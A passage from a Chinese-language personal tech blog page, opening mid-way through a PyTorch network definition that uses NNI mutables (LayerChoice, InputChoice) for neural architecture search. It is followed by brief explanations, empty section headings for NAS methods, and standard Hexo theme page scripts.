nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">1</span>, key=<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.mid_conv(x)</span><br><span class="line">        skip_x = self.input_switch([x])</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> skip_x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            x = x + skip_x</span><br><span class="line">        x = self.pool(F.relu(x))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p><code>mutables.LayerChoice</code>实现了神经网络模型中一层的多选一，待选的神经网络层只需要在里面列出来即可。例如上面的代码，就实现了3*3和5*5两种二维卷积层的选择空间。</p>
<p><code>mutables.InputChoice</code>实现了可跳过连接。在上述代码中，表示了mid_conv层是可跳过层。可跳过层的前后代码保持不变，在可跳过层则需要从可能连接加入到后一层的输出中。</p>
<h3 id="Classical-NAS"><a href="#Classical-NAS" class="headerlink" title="Classical NAS"></a>Classical NAS</h3><h3 id="One-shot-NAS"><a href="#One-shot-NAS" class="headerlink" title="One-shot NAS"></a>One-shot NAS</h3><h3 id="DARTS"><a href="#DARTS" class="headerlink" title="DARTS"></a>DARTS</h3><h3 id="ENAS"><a href="#ENAS" class="headerlink" title="ENAS"></a>ENAS</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Garen Wang"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Garen Wang</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">20</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Garen-Wang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Garen-Wang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:garen-wang@qq.com" title="E-Mail → mailto:garen-wang@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备2021003110号 </a>
      <img src="/images/beian.png" style="display: inline-block;">
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Garen Wang</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : true,
      appId      : 'wMExYSieDga8BTVjfcUnCRh1-gzGzoHsz',
      appKey     : 'pYUGXalVN490u6EsT2HJA4Rj',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/theresa.model.json"},"display":{"position":"left","width":150,"height":300},"react":{"opacity":0.5}});</script></body>
</html>
